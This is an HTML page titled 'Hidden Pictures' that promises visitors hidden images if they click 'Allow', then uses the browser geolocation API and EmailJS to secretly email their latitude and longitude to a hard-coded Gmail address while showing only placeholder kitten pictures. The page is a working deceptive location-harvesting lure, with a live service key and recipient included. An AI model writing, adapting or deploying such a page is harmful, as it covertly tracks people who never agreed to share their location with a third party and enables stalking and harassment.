<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Hidden Pictures</title>

  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("zLqf-Uoq_p2HH3uoA"); // your public key
    })();
  </script>

  <style>
    /* Background Animation */
    body {
      margin: 0;
      height: 100vh;
      font-family: Arial, sans-serif;
      color: white;
      text-align: center;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(-45deg, #1a1a1a, #333, #111, #000);
      background-size: 400% 400%;
      animation: gradient 15s ease infinite;
    }
    @keyframes gradient {
      0% {background-position: 0% 50%;}
      50% {background-position: 100% 50%;}
      100% {background-position: 0% 50%;}
    }

    h1 {
      font-size: 3rem;
      font-weight: bold;
      letter-spacing: 3px;
      text-transform: uppercase;
      text-shadow: 0px 0px 10px #00ffcc;
    }

    #content {
      display: none;
      margin-top: 20px;
    }

    .btn {
      margin-top: 20px;
      padding: 12px 25px;
      font-size: 1.1rem;
      font-weight: bold;
      color: black;
      background: #00ffcc;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: 0.3s;
    }
    .btn:hover {
      background: #00cc99;
    }
  </style>
</head>
<body>
  <div>
    <h1>HIDDEN PICTURES</h1>
    <p id="message">üìç Please click allow to let us take you to the hidden pictures.</p>
    <button class="btn" onclick="getLocation()">Allow</button>
    <div id="content">
      <p>üéâ Thanks! Here are your hidden pictures:</p>
      <img src="https://placekitten.com/300/200" alt="Hidden 1">
      <img src="https://placekitten.com/301/200" alt="Hidden 2">
    </div>
  </div>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, showError);
      } else {
        alert("Username entering not supported by this browser.");
      }
    }

    function sendLocation(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      // send to your email via EmailJS
      emailjs.send("service_33333", "template_k7tns98", {
        to_email: "gamerofminecraft223@gmail.com",
        latitude: lat,
        longitude: lon
      }).then(function(response) {
        console.log("Location sent!", response.status, response.text);
      }, function(error) {
        console.error("Failed to send location.", error);
      });

      // Show hidden pictures
      document.getElementById("message").style.display = "none";
      document.querySelector(".btn").style.display = "none";
      document.getElementById("content").style.display = "block";
    }

    function showError(error) {
      switch(error.code) {
        case error.PERMISSION_DENIED:
          alert("‚ùå Permission denied. Cannot unlock pictures.");
          break;
        case error.POSITION_UNAVAILABLE:
          alert("‚ö†Ô∏è Location unavailable.");
          break;
        case error.TIMEOUT:
          alert("‚è≥ Location request timed out.");
          break;
        default:
          alert("Unknown error.");
          break;
      }
    }
  </script>
</body>
</html>
